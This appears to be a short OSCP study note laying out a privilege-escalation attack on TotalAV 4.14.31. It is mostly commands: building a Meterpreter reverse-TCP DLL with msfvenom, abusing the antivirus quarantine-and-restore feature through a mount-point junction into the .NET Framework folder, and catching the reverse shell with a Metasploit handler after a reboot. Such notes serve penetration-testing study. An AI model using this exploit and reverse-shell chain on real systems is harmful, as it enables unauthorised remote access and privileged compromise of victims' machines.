totalAV 4.14.31

Create folder called Mount

Create version.dll and transfer into folder Mount

LPORT 139 | version.dll
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `msfvenom -p windows/meterpreter/reverse_tcp ${KaliIP} LPORT=139 -f dll > version.dll`;

dv.paragraph("```bash\n" + command + "\n```");
```
Use antivirus to quarantine this version.dll

CreateMountPoint.exe (cd ~/Desktop/Tools/Symlink-Tools-Compiled)
```powershell
PS C:\> .\CreateMountPoint.exe "C:\mount" "C:\Windows\Microsoft.NET\Framework\v4.0.30319\"
```

Restore version.dll back into this symlinked folder

On KALI ATTACKER

```
msfconsole -q
```

```
use exploit/multi/handler
```

```
set PAYLOAD windows/meterpreter/reverse_tcp
```

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `set LHOST ${KaliIP}`;

dv.paragraph("```bash\n" + command + "\n```");
```
```
set LPORT 139
```

```
run
```

Reboot

```powershell
PS C:\User> shutdown /r /t 0
```

Should receive connection

```
shell
```